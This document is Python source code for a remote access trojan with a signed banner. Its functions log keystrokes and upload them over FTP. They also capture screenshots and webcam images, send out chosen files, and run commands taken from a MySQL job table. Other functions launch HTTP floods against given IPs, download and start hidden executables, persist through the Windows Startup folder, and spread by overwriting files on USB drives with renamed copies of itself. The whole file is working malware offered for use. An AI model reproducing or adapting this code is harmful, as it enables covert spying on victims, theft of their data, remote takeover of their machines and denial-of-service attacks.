############################################################################
#[+]CODDED BY Dan                                                 #
#                [-]CHANGING NAME WILL NOT MAKE YOU CODDER XD              #
# [*]NOTE : # FOR DIBUG ## FOR DISABLED CODE                               #
############################################################################
import pyHook                              #FOR KEYLOGGER                  #
import pygame                              #FOR KEYLOGGER                  #
import pythoncom                           #To Do THREADING IN WINDOWS     #
import threading                           #FOR THREADING                  #
import wmi                                 #USB COPY                       #
import urllib2                             #FOR FILE DOWNLOAD              #
import socket                              #FOR NETWORKING                 #
import pygame.image                        #CAM CAPTURING                  #
import random                              #TO GENRATE RANDOM              # 
import string                              #FOR STRING                     # 
import pygame.camera                       #FOR CAM                        #
import ftplib                              #FOR FTP                        #
import sys                                 #FOR USING SYS                  #
import os                                  #FOR OS FUNC                    #
import time                                #SLEEP FUNCTON                  #
import shutil                              #FOR COPY                       #
import platform                            #FOR OS INFO                    #  
import MySQLdb                             #FOR MYSQL DB                   #  
import uuid                                #FOR UNIQUE ID GENERATION       #  
from PIL import ImageGrab #screen shoot                                    #  
############################################################################
#GLOBAL VERIABLE                                                           #
ret = ''                                                                   #
############################################################################
#FTP CREDENTIALS                                                           #
pathinserver='/'                                                           #
ftpServer=''                                                      #
ftpUser =''                                                           #
ftpPass=''                                                             #
############################################################################
#DATABASE CREDENTIALS                                                      #
DBuser=''                                                              #
DBpass=''                                                                  #
Db=''                                                                #
Dbserver=''                                                       #
##############################################################################
#TO GENRATE RANDOM STRING                                                    #
uniqueids = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))      #
def genRandomString(slen=10):                                                #
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))#
##############################################################################
#FUNCTION TO CONENCT DATABASE
def database():
    print "running database"
    x=0
    while x==0:
        try :
            db = MySQLdb.connect(Dbserver,DBuser,DBpass,Db )
            uname = platform.uname() #PRINT EVERY SHIT OF OS
        except :
            time.sleep(5)
            continue
        else:
            check = 0
            User = os.environ['USERNAME'];
            uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
            cursor = db.cursor()
            checkquery = """Select * from `info`"""
            cursor.execute(checkquery)
            results = cursor.fetchall()
            for row in results:
                if(uniqueid== row[9]):
                    check = 1
                    print "i am already in"
            if check != 1:
                query = """ INSERT INTO `info`(`UNIQUE_ID`,`tim3_date`,`Us3r`,`Syst3m`,  `node`, `r3lease`, `version`, `machine`, `processor`) VALUES ('%s',NOW(),'%s','%s','%s','%s','%s','%s','%s')""" % (uniqueid,User,uname[0], uname[1], uname[2], uname[3], uname[4],uname[5])
                try:
                    cursor.execute(query)
                    db.commit()
                except :
                    db.rollback()
                    time.sleep(5)
                    continue
            else:
                return 1
                db.close()
####################################################################################
class Keylogger(threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.windowname = None
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
        self.hm.HookKeyboard()
        
    def run(self):
                                           # initialize pygame and start the game loop
        pygame.init()
        while True:
            pygame.event.pump()
                                            #or pythoncom.PumpMessages()
            
    def OnKeyboardEvent(self, event):
        fo = open("foo.txt", "a")
        

        if event.WindowName != self.windowname:
            self.windowname = event.WindowName
            x ="\n\nWindow: " +  self.windowname
            fo.write(x+"  ")
        if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
            grabber2 = chr(event.Ascii)
            fo.write(grabber2)
        '''
        print 'MessageName:',event.MessageName
        print 'Message:',event.Message
        print 'Time:',event.Time
        print 'Window:',event.Window
        print 'WindowName:',event.WindowName
        print 'Ascii:', event.Ascii, chr(event.Ascii)
        print 'Key:', event.Key
        print 'KeyID:', event.KeyID
        print 'ScanCode:', event.ScanCode
        print 'Extended:', event.Extended
        print 'Injected:', event.Injected
        print 'Alt', event.Alt
        print 'Transition', event.Transition
        print '---'
        '''      
############################################################################

def keylogssenderbot():
    try:
        fnamess  = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
        fnamess = fnamess+'.txt'
        os.chdir(os.getenv('TEMP'))
        session = ftplib.FTP(ftpServer,ftpUser,ftpPass)
        session.cwd(pathinserver)
        file = open(fnamess,'rb')                  # file to send
        c= 'STOR '+fnamess                         # storing stor and path in one file
        session.storbinary(c, file)                # send the file
        file.close()                               # close file and FTP
        session.quit()
    except:
        print "exception in keylogssenderbot"



##############################################################################
def copy():
    try:
        print "running copy"
        usr = os.environ.get( "USERNAME" )
        path = 'C:\\Users\\'+usr+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        current = os.getcwd()
        if path != current :
            os.listdir(path)
            Filename =os.path.basename(__file__)
            length = len(Filename)
            newvar = Filename[:length-3]+'.exe'
            dirs = os.listdir(path)
            print dirs
            if newvar not in dirs:
                shutil.copy2(newvar, path)
                towrite = "start "+newvar
                filepath = path+"\\boot.bat"
                ##print filepath
                ##f = open(filepath, "wb")
                ##f.write("cd /d %~dp0 \n"+towrite);
                ##f.close()
                os.chdir(path)
                ##print filepath
                ##os.popen('attrib +h boot.bat')
                ##os.popen("attrib +h "+newvar)
    except:
        print"Error in copy"
###############################################################################
def screenshoot():
    try:
        print "running screenshoot"
        img=ImageGrab.grab()
        fname = genRandomString() + '.png'
        saveas= os.path.join(os.getenv('TEMP'), fname )
        img.save(saveas)
        os.chdir(os.getenv('TEMP'))
        session = ftplib.FTP(ftpServer,ftpUser,ftpPass)
        session.cwd(pathinserver)
        file = open(fname,'rb')                        # file to send
        c= 'STOR '+fname                               # storing stor and path in one file
        session.storbinary(c, file)                    # send the file
        file.close()                                   # close file and FTP
        session.quit()
        os.remove(saveas)
        return pathinserver+fname
    except:
        return "Failed..!"
###############################################################################    
def cmdexecution(cmd): 
    try:
        print "running cmd execution"
        saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.txt')
        finalcmd = cmd+" >> "+saveas
        os.system(finalcmd)
        return saveas
    except:
        return "Failed..!"
###############################################################################
def camshoot():
    try:
        print "running camshoot"
        pygame.camera.init()
        cam = pygame.camera.Camera(pygame.camera.list_cameras()[0])
        cam.start()
        img = cam.get_image()
        fname = genRandomString() + '.png'
        saveas= os.path.join(os.getenv('TEMP'), fname )
        pygame.image.save(img,saveas)
        pygame.camera.quit()
        os.chdir(os.getenv('TEMP'))
        session = ftplib.FTP(ftpServer,ftpUser,ftpPass)
        session.cwd(pathinserver)
        file = open(fname,'rb')                                # file to send
        c= 'STOR '+fname                                       # storing stor and path in one file
        session.storbinary(c, file)                            # send the file
        file.close()                                           # close file and FTP
        session.quit()
        os.remove(saveas)
        return pathinserver+fname
    except:
        return "Failed..!"
###################################################################################
def download(filepath,filenamex):
    try:
        print "running download"
        os.chdir(filepath)
        session = ftplib.FTP(ftpServer,ftpUser,ftpPass)
        session.cwd(pathinserver)
        print os.getcwd()
        print filenamex
        saveas=filenamex
        file = open(saveas,'rb')                              # file to send
        c= 'STOR '+saveas                                     # storing stor and path in one var
        session.storbinary(c, file)                           # send the file
        file.close()                                          # close file and FTP
        session.quit()
        return pathinserver+filenamex
    except:
        return "Failed..!"
###################################################################################        
def httpflood(ip,port,amount):

    print "running ddos"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port=int(port)
        amount = int(amount)
        
            
        s.connect((ip, port))  
        while amount!=0:
            s.send("""GET /?="""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """)
            print """GET /"""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
             Connection: Keep-Alive """
            amount = amount-1  
    except:
        return "Done..!"

####################################################################################
def installfile(link,local_name):
    try:
        print "running installfile"
        ratlink=link
        print ratlink
        df = urllib2.urlopen(ratlink)            #LINK OF FILE ON HTTP
        output = open(local_name,"wb")
        x= df.read() 
        output.write(x)
        output.close()
        os.popen("attrib +h "+local_name)
        os.popen("start "+local_name)
        return "Done..!"
    except:
        print"Failed...!"
######################################################################################        
def usbcopy():
    pythoncom.CoInitialize()
    print "i m in thread"
    DRIVE_TYPES = {
    0 : "Unknown",
    1 : "No Root Directory",
    2 : "Removable Disk",
    3 : "Local Disk",
    4 : "Network Drive",
    5 : "Compact Disc",
    6 : "RAM Disk"
    }
    ifusb = 'Removable Disk'
    c = wmi.WMI ()
    currentpth=os.getcwd()
    Filename =os.path.basename(__file__)
    for drive in c.Win32_LogicalDisk ():
        x = drive.Caption, DRIVE_TYPES[drive.DriveType]
        if ifusb in x:
            dirs = os.listdir(x[0])
            pass
            for name in dirs:
                print name
                print Filename
                print dirs  
                shutil.copy(Filename, x[0])
                os.chdir(x[0])  
                print os.getcwd()
                try:
                    os.remove(name)
                except Exception, e:
                    print os.listdir(x[0])
                    print "one except"
                    os.remove(Filename)
                    print os.listdir(x[0])
                    os.chdir(currentpth)
                    continue
                else:
                    newname = name+'.exe'
                    os.rename(Filename,newname)
                    os.chdir(currentpth)
####################################################################################
class keylogssender (threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        
    def run(self):
        while 1:
            time.sleep(60)
            keylogssenderbot()
####################################################################################            
class myThread (threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        
    def run(self):
        while 1:

            usbcopy()
            time.sleep(30)
####################################################################################
def seekjob():
    print "running seekjob"
    x=0
    while x==0:
        try :
            db = MySQLdb.connect(Dbserver,DBuser,DBpass,Db )
            print "Database connected jobseeker"
        except :
            print "Failed to connect to Database jobseeker"
            time.sleep(5)
            continue
        else:
            x=1    
            check = 0
            cursor = db.cursor()
            checkquery = """Select * from `cmd` """
            cursor.execute(checkquery)
            results = cursor.fetchall()
            uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
            for row in results:
                print row
                if(uniqueid== row[1] and row[3]==0):
                    jobnum = row[0]
                    jobnum = int(jobnum)
                    job = row[2]
                    print "my job is "+job
                    if job=='screenshoot':
                        ret = screenshoot()
                        print ret
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (ret,jobnum)
                        cursor.execute(query)
                        db.commit()
                    if job == 'camshoot':
                        ret = camshoot()
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (ret,jobnum)
                        cursor.execute(query)
                        db.commit()
                    if job == 'download':
                        filepath  = row[6]
                        filenamex = row[7]
                        ret = download(filepath,filenamex)
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (ret,jobnum)
                        cursor.execute(query)
                        db.commit()
                    if job == 'cmdexecution':
                        cmd = row[6];
                        ret = cmdexecution(cmd);
                        fo = open(ret, "r+")
                        stri = fo.read();
                        stri=stri+'</pre>'
                        stri='<pre>'+stri
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (stri,jobnum)
                        cursor.execute(query)
                        db.commit()   
                        
                        #os.remove(ret)                     
                    if job == 'httpflood':
                        ip = row[6]
                        port = row[7]
                        amount = row[8]
                        ret = httpflood(ip,port,amount)
                        print jobnum
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (ret,jobnum)
                        cursor.execute(query)
                        db.commit()   
                    if job == 'installfile':
                        link = row[6]
                        local_name =row[7]
                        ret = installfile(link,local_name)
                        query = """UPDATE `cmd` SET `statu$`= 1,Output= '%s' WHERE `id` = '%d' """ % (ret,jobnum)
    
            else:
                print "jobseeker sleeping"
                time.sleep(10)
                main()

           

def main():
    print "im in main"
    
    seekjob()
    main()
database()
try:
    copy()
except:
    print "unable to copy my self"    


try:
    thread1 = myThread(1, "Thread-1")


    k = Keylogger('i','o')
    k.start()

# Start new Threads
    thread1.start()

    thread  = keylogssender('s','se')
    thread.start()
except:
    print "i got exception in starting threads"


main()

